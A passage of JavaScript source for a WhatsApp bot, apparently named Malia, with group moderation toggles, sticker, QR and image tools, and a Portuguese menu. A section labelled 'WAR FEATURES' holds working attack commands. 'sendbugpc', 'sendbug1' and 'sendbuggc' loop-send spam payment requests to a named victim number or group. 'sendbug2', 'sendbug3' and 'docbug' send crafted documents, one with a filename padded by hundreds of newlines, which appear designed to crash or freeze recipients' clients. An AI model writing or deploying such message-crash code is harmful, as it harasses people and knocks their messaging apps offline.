  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('Já está Ativado!')
ntilinkfb.push(from)
m.reply('Success in turning on facebook antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('Já está Desativado!')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
m.reply('Success in turning off facebook antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('Já está Ativado!')
ntilinktg.push(from)
m.reply('Success in turning on telegram antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('Já está Desativado!')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
m.reply('Success in turning off telegram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('Já está Ativado!')
ntilinktt.push(from)
m.reply('Success in turning on tiktok antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('Já está Desativado!')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
m.reply('Success in turning off tiktok antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Já está Ativado!')
ntilinktwt.push(from)
m.reply('Success in turning on twitter antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('Já está Desativado!')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
m.reply('Success in turning off twitter antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Já está Ativado!')
ntilinkall.push(from)
m.reply('Success in turning on all antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('Já está Desativado!')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
m.reply('Success in turning off all antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiToxic) return m.reply('Já está Ativado!')
nttoxic.push(from)
m.reply('Success in turning on antitoxic in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return m.reply('Já está Desativado!')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
m.reply('Success in turning off antitoxic in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
 
case 'animesticker': case 'animestick': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'toqr':{
  if (!q) return m.reply(' Please include link or text!')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await client.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'upscaler':{
	if (!isQuotedImage) return m.reply('Reply the picture!')
     let media = await client.downloadAndSaveMediaMessage(m.message.extendedTextMessage.contextm.quotedMessage.imageMessage, 'image')
      let tph = await TelegraPh(media)
     let anu = await imgSuper(tph)
     console.log(tph)
     console.log(anu)
     await client.sendMessage(from, { image: { url: anu.output_url }, caption:"Here you go!"}, { quoted: m })
     
   }
   break
case 'setthumb':{
     if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
     if (!isQuotedImage) return m.reply('Reply the picture!')
         let media = await client.downloadMediaMessage(m.message.extendedTextMessage.contextm.quotedMessage.imageMessage, 'image')
await fs.writeFileSync('./Media/theme/cheemspic.jpg', media)
               m.reply(mess.success)
            }
          break
case 'imagenobg': case 'removebg': case 'remove-bg': {
   if (!isQuotedImage) return m.reply('Reply the picture!') 
     let media = await client.downloadMediaMessage(m.message.extendedTextMessage.contextm.quotedMessage.imageMessage, 'image')
     let ranE = getRandom('.jpg')
       await fs.writeFileSync('./Media/image/' + ranE, media)
     const _buff = './Media/image/' + ranE
     let anu = await remove(fs.readFileSync(_buff))
     console.log(anu)
      	let ranJ = getRandom('.jpg')
        await fs.writeFileSync('./Media/image/' + ranJ, anu)
        const buff = './Media/image/' + ranJ        
          await client.sendMessage(from, { image: { url: buff }, caption:"Here you go!"}, { quoted: m })
        setTimeout(() => { fs.unlinkSync(buff) }, 10000)
        setTimeout(() => { fs.unlinkSync(_buff) }, 10000)     
   }
   break
case 'readqr':{
   if ((!isMedia && !isQuotedImage)  && args.length == 0) {
   let buffer = await client.downloadAndSaveMediaMessage(m.message.extendedTextMessage.contextm.quotedMessage.imageMessage, 'image')
    var Jimp = require("jimp");
   Jimp.read(buffer, function(err, image) {
    if (err) {
        console.error(err);
        //handle error
    }
    var qr = new QrCode();
    qr.callback = function(err, value) {
        if (err) {
            console.error(err);
            //handle error
        }
        console.log(value.result);
       m.reply(value.result)     
    };
    qr.decode(image.bitmap);
    });
   } else { m.reply(`Reply image with caption ${prefix + command} \n`) }
   }
   break
case 'swm': case 'stickerwm': case 'roubar': case 'take': {  
            let text1 = q.split("|")[0]
            let text2 = q.split("|")[1]
              if (!isQuotedSticker) return m.reply(`Reply to a sticker with caption ext|text\n\nExample: ${prefix + command} Cheems|Xeon`)   
              if (!text1) return m.reply(`Example! : ${order + ' ' + `Cheems|Xeon`}`)    
              if (!text2) return m.reply(`Example! : ${order + ' ' + `Cheems|Xeon`}`)
client.sendMessage(from, { react: { text: "⏱️", key: m.key }})
          try{ 
             let buff = await client.downloadMediaMessage(m.message.extendedTextMessage.contextm.quotedMessage.stickerMessage, 'sticker')
             console.log(buff)
             let proc = await writeExifStc(buff, { packname: text1, author: text2 })
             await client.sendMessage(from, { sticker: { url: proc } }, { quoted: m })
             await fs.unlinkSync(proc)
           } catch (e) { m.reply(e) }
          }
          break
case 'creategroup':
if (!isCreator) return m.reply(mess.owner)
if (!q) return reply("Enter text")
const group = await client.groupCreate(q, [owner + "@s.whatsapp.net"])
m.reply(mess.success)
client.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
case 'addanoucment': case 'addannouncement':
				if (!isCreator) return m.reply(mess.owner)
				xeonannou.push(`${q}`)
				xeonannou.splice(0,1)
				fs.writeFileSync('./database/anoucement.json', JSON.stringify(snt))
				m.reply('success anoucement!')
				break

//-------------------☣️WAR FEATURES☣️-----------------\\
//-------------------☣️WAR FEATURES☣️-----------------\\
//-------------------☣️WAR FEATURES☣️-----------------\\
case 'poll': {
if (!isCreator) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": botname,
"options": [
	{
"optionName": "GANHAR UMA FERRARI"
	},
	{
"optionName": "GANHAR IPHONE 14 PRO MAX"
	},
	{
"optionName": "GANHAR UM +55"
	},
	{
"optionName": "GANHAR UM +54"
	},
	{
"optionName": "GANHAR UM +64"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
client.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('Enviado com sucesso!')
}
break
case 'thisbug': {
if (!isCreator) return
let teks = `══✪〘 *Isso é um BUG, mano? ☺️* 〙✪══
 ➲ *Message : ${q ? q : 'empty'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
client.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case 'sendbugpc': {
if (args.length < 1) return m.reply(`*Error!*\n\nGunakan : ${command} nomer korban|jumlah spam|timer\nContoh : ${command} 916909s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir!`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xeonvirtex.js') }, { upload: client.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": wm,
}
}}), { userJid: m.chat, quoted: doc})
client.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'sendbug1': {
if (!isCreator) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nGunakan : ${command} idGroup|Jumlah spam|timer\nContoh : ${command} 916909@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xeonbrutal.js') }, { upload: client.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `DEV: RISKY`,
}
}}), { userJid: m.chat, quoted: doc})
client.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'sendbuggc': {
if (!isCreator) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nGunakan : ${command} idGroup|Jumlah spam|timer\nContoh : ${command} 916909@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: client.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `DEV: RISKY`,
}
}}), { userJid: m.chat, quoted: doc})
client.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'sendbug3': {
if (!isCreator) return
lodaChoos = fs.readFileSync('./XBug/randiKaBaccha.sound')
client.sendMessage(m.chat, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
}
break
case 'sendbug2': {
if (!isCreator) return
 lodaChoos2 = fs.readFileSync('./XBug/randiKaBaccha.sound')
 client.sendMessage(m.chat, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
 }
 break
case 'docbug': {
if (!isCreator) return
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": botname,
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🦄${ownername}🦄\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbut2}.sound`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
client.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break




case 'tqto': 
throw `Thanks to
┏═┅〔 *SUPPORT* 〕┅═
┃⫹⫺ 
┃⫹⫺ 
┃⫹⫺ 
┗═┅〔 *Made By Risky* 〕┅═`
break
case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            let jarot = `┏─────────────────⬣
┆ 𝑯𝒂𝒊, ${ucapanWaktu} ${pushname}
┗┬──────────────┈ ⳹
┏┤ Informações da Malia
┆┗──────────────┈ ⳹
┆♠︎ 𝗡𝗼𝗺𝗲 - 𝗕𝗼𝘁  : ${global.botname}
┆♠︎ 𝗗𝗲𝘃 - 𝗕𝗼𝘁 : ${global.developer}
┆♠︎ 𝗣𝗹𝗮𝘁𝗮𝗳𝗼𝗿𝗺𝗮 : ${os.platform()}
┆♠︎ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
┆♠︎ 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${jumlahcmd}
┆♠︎ 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 𝗛𝗼𝗷𝗲 : ${jumlahharian}
┆♠︎ 𝗧𝗲𝗺𝗽𝗼 𝗢𝗡 : ${runtime(process.uptime())}
┆♠︎ 𝗣𝗶𝗻𝗴 : ${latensie.toFixed(4)} miliseconds
┗┬──────────────┈ ⳹
┏┤   Informações do User
┆┗──────────────┈ ⳹ 
┆♠︎ 𝗡𝗼𝗺𝗲 : ${pushname}
│♠︎ 𝗡𝘂𝗺. : @${me.split('@')[0]}
│♠︎ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPremium ? '✅' : `❌`}
│♠︎ 𝗟𝗶𝗺𝗶𝘁𝗲 : ${isPremium ? '♾ Ilimitado' : `〽️${db.data.users[m.sender].limit}`}
┗┬──────────────┈ ⳹
┏┤ Data de Hoje
┆┗──────────────┈ ⳹
┆𝗗𝗮𝘁𝗮 : ${xdate}
┆𝗛𝗼𝗿𝗮 : ${xtime}
┗─────────────────⬣`
      let ments = [ownernya, me, ini_mark]        
            let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '𝘛𝘰𝘥𝘰𝘴 𝘊𝘰𝘮𝘢𝘯𝘥𝘰𝘴' }, type: 1 },{ buttonId: 'command', buttonText: { displayText: '𝘔𝘦𝘯𝘶 𝘓𝘪𝘴𝘵𝘢' }, type: 1 }]
            let buttonMessage = {
  document: fs.readFileSync('./Media/theme/cheems.xlsx'),
  fileName : `${groupMetadata.subject || 'Malia Multi-Serviços'}`,
  mimetype: `${docs}`,
  fileLength: '99999999999999',
  pageCount: '1000000000',
  caption: jarot,
  footer: botname,
  buttons: buttons,
  mentions: ments,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: botname,
  body: wm, 
  showAdAttribution: true,
  thumbnail: thumb,
  mediaType: 2,
  mediaUrl: websitex1,
  sourceUrl: websitex
  }}
  }
  client.sendMessage(m.chat, buttonMessage, {quoted: fkontak})
  }
 break
            break
            case 'command': {
	const sections = [{
								"title": "𝙼𝚊𝚕𝚒𝚊-𝙼𝚞𝚕𝚝𝚒𝙳𝚎𝚟𝚒𝚌𝚎",
								"rows": [
									{
										"title": "𝘖𝘶𝘵𝘳𝘰𝘴 𝘮𝘦𝘯𝘶𝘴",
										"description": "𝘈𝘣𝘳𝘪𝘳 𝘰𝘶𝘵𝘳𝘰𝘴 𝘮𝘦𝘯𝘶𝘴",
										"rowId": `${prefix}othermenu`
									}
								]
							},
							{
								"title": "𝙻𝚒𝚜𝚝𝚊 𝙼𝚊𝚕𝚒𝚊-𝙼𝚍️",
								"rows": [
									{
										"title": "𝘛𝘰𝘥𝘰𝘴 𝘰𝘴 𝘤𝘰𝘮𝘢𝘯𝘥𝘰𝘴",
										"description": "𝘝𝘦𝘫𝘢 𝘵𝘰𝘥𝘰𝘴 𝘰𝘴 𝘮𝘦𝘶𝘴 𝘤𝘰𝘮𝘢𝘯𝘥𝘰𝘴",
										"rowId": `${prefix}allmenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘥𝘰 𝘥𝘦𝘴𝘦𝘯𝘷𝘰𝘭𝘷𝘦𝘥𝘰𝘳",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}ownermenu`
										},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘱𝘢𝘳𝘢 𝘎𝘳𝘶𝘱𝘰𝘴",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}groupmenu`
										},
										{
										"title": "𝘔𝘦𝘯𝘶 𝘔𝘢𝘬𝘦𝘳",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶. ",
										"rowId": `${prefix}makermenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘈𝘶𝘥𝘪𝘰𝘴",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}soundmenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥𝘦𝘳",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}downloadmenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘚𝘵𝘪𝘤𝘬𝘦𝘳",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}stickermenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘥𝘦 𝘗𝘦𝘴𝘲𝘶𝘪𝘴𝘢𝘴",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}searchmenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘐𝘮𝘢𝘨𝘦𝘯𝘴 𝘈𝘭𝘦𝘢𝘵𝘰𝘳𝘪𝘢𝘴",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}randomimagemenu`
									},
									{
										"title": "𝘔𝘦𝘯𝘶 𝘥𝘦 𝘌𝘧𝘦𝘪𝘵𝘰𝘴",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}imageeffectmenu`
									},
										{
											"title": "𝘔𝘦𝘯𝘶 𝘈𝘯𝘪𝘮𝘦",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}animemenu`
										},
										{
											"title": "𝘔𝘦𝘯𝘶 𝘌𝘮𝘰𝘵𝘦",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}emotemenu`
										},
										{
										"title": "𝘔𝘦𝘯𝘶 𝘚𝘵𝘪𝘤𝘬𝘦𝘳 𝘈𝘯𝘪𝘮𝘦",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}animestickermenu`
									     },
									{
										"title": "𝘔𝘦𝘯𝘶 𝘕𝘴𝘧𝘸",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}nsfwmenu`
									     },
										{
											"title": "𝘔𝘦𝘯𝘶 𝘥𝘦 𝘋𝘪𝘷𝘦𝘳𝘴𝘢𝘰",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}funmenu`
										},
										{
										"title": "𝘔𝘦𝘯𝘶 𝘥𝘦 𝘑𝘰𝘨𝘰𝘴",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}gamemenu`
									},
										{
											"title": "𝘔𝘦𝘯𝘶 𝘊𝘰𝘯𝘷𝘦𝘳𝘴𝘢𝘰",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}convertmenu`
										},
										{
											"title": "𝘔𝘦𝘯𝘶 𝘋𝘢𝘵𝘢𝘣𝘢𝘴𝘦",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘴𝘴𝘦 𝘮𝘦𝘯𝘶.",
										"rowId": `${prefix}databasemenu`
										}
								]
							},
							{
								"title": "𝚁𝚘𝚊𝚖 𝙲𝚑𝚊𝚝",
								"rows": [
									{
